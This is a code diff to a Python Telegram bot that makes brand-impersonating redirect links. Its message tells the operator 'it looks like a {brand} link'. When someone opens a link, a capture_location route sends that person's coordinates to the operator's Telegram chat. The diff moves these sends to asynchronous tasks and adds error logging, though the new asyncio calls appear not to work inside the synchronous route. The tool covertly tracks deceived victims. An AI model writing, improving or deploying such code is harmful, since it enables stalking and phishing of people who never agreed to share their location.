@@ -354,15 +354,18 @@ def capture_location():
         chat_id = result[0]
         try:
             from telegram import Bot
+            import asyncio
             bot = Bot(token=TELEGRAM_TOKEN)
-            bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude)
-            bot.send_message(
+            # Send location and message asynchronously
+            asyncio.create_task(bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude))
+            asyncio.create_task(bot.send_message(
                 chat_id=chat_id,
                 text=f"📍 Location Captured!\n\nCoordinates: {latitude:.6f}, {longitude:.6f}",
                 parse_mode=None
-            )
-        except:
-            pass
+            ))
+            print(f"Location sent to chat_id: {chat_id}")
+        except Exception as e:
+            print(f"Error sending location: {e}")
     
     return jsonify({'success': True})
 
@@ -451,7 +454,7 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🌐 Redirects to: {website_url}\n\n"
         f"Share this link - it looks like a {brand_info['name']} link!",
         reply_markup=reply_markup,
-        parse_mode=None  # Disable markdown to avoid parsing errors
+        parse_mode=None
     )
     
     return ConversationHandler.END
